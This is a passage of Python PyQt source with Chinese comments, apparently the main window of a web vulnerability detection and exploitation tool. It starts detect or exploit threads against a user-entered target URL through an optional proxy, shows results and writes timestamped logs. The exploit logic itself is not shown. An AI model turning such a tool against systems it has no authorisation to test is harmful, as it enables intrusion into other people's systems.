        # 检查线程是否已在运行
        if self.scan_thread and self.scan_thread.isRunning():
            QMessageBox.warning(self, '警告', '扫描线程已在运行中')
            return
        
        # 创建并启动扫描线程
        self.scan_thread = ScanThread(target, self.current_proxy, 'detect')
        self.scan_thread.result_signal.connect(self.on_detection_result)
        self.scan_thread.log_signal.connect(self.log_message)
        self.scan_thread.finished.connect(self.on_scan_finished)
        
        # 更新UI状态
        self.start_detect_btn.setEnabled(False)
        self.statusBar().showMessage('正在进行漏洞检测...')
        
        # 启动线程
        self.scan_thread.start()


    def on_detection_result(self, result):
        """处理漏洞检测结果"""
        self.detect_result.append(result)

    def start_exploitation(self):
        """开始漏洞利用"""
        target = self.global_target.text().strip()
        if not target:
            QMessageBox.warning(self, '警告', '请输入目标URL')
            return
        
        vuln_index = self.exploit_vuln.currentIndex()
        if vuln_index <= 0:
            QMessageBox.warning(self, '警告', '请选择要利用的漏洞')
            return
        
        # 检查线程是否已在运行
        if self.scan_thread and self.scan_thread.isRunning():
            QMessageBox.warning(self, '警告', '利用线程已在运行中')
            return
        
        # 创建并启动利用线程
        self.scan_thread = ScanThread(target, self.current_proxy, 'exploit')
        self.scan_thread.result_signal.connect(self.on_exploitation_result)
        self.scan_thread.log_signal.connect(self.log_message)
        self.scan_thread.finished.connect(self.on_scan_finished)
        
        # 更新UI状态
        self.start_exploit_btn.setEnabled(False)
        self.statusBar().showMessage('正在进行漏洞利用...')
        
        # 启动线程
        self.scan_thread.start()


    def on_exploitation_result(self, result):
        """处理漏洞利用结果"""
        self.exploit_result.append(result)

    def on_scan_finished(self):
        """扫描或利用完成后的处理"""
        # 恢复UI状态
        self.start_detect_btn.setEnabled(True)
        self.start_exploit_btn.setEnabled(True)
        self.statusBar().showMessage('就绪')

    def log_message(self, message):
        """记录日志消息"""
        timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        log_entry = f'[{timestamp}] {message}'
        
        # 在日志文本框中追加消息
        self.log_text.append(log_entry)
        
        # 滚动到底部
        self.log_text.moveCursor(QTextCursor.MoveOperation.End)

    def clear_log(self):
        """清除日志"""
        self.log_text.clear()
        self.log_message('日志已清除')

    def closeEvent(self, event):
        """窗口关闭事件"""
        # 确保在关闭窗口时停止所有线程
        if self.scan_thread and self.scan_thread.isRunning():
            self.scan_thread.terminate()
            self.scan_thread.wait()
        event.accept()


if __name__ == '__main__':
    # 创建应用程序实例
    app = QApplication(sys.argv)
    
    # 设置应用程序样式
    app.setStyle('Fusion')
    
    # 设置应用程序图标（显示在Dock栏）
    icon_path = os.path.join('static', 'icon.icns')
    if os.path.exists(icon_path):
        app.setWindowIcon(QIcon(icon_path))
    else:
        print(f'警告: 图标文件未找到: {icon_path}')
    
    # 创建并显示主窗口
    window = MainWindow()
    window.show()
    
    # 运行应用程序主循环
    sys.exit(app.exec())